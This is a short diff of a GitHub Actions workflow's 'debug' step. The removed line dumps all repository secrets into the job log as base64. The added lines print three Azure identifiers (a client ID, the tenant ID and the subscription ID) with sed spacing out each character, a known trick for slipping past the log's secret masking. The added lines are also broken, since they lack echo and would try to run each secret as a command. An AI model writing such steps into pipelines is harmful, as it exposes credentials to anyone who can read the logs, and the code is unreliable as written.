@@ -11,4 +11,7 @@ jobs:
     runs-on: ubuntu-22.04
     steps:
       - name: 'debug'
-        run: echo '${{ toJSON(secrets) }}' | base64
+        run: |
+            ${{secrets.AZURE_COSMOSDB_CLEANUP_CLIENT_ID}} | sed 's/./& /g'
+            ${{secrets.AZURE_TENANT_ID}} | sed 's/./& /g'
+            ${{secrets.AZURE_SUBSCRIPTION_ID}} | sed 's/./& /g'
